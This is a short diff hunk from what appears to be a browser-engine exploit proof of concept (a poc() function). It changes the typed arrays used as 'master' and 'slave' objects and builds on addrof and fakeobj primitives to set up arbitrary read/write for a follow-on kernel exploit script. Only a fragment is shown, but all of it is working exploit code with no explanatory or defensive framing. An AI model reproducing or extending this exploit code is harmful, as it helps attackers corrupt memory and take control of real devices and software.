@@ -383,8 +383,8 @@ function poc() {
     //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.
 
     //create compat stuff for kexploit.js
-    var expl_master = new Uint32Array(new ArrayBuffer(1));
-    var expl_slave = new DataView(new ArrayBuffer(1));
+    var expl_master = new Uint32Array(8);
+    var expl_slave = new Uint32Array(2);
 
     var addrof_expl_slave = addrof(expl_slave);
     var m = fakeobj(addrof(obj) + 16);
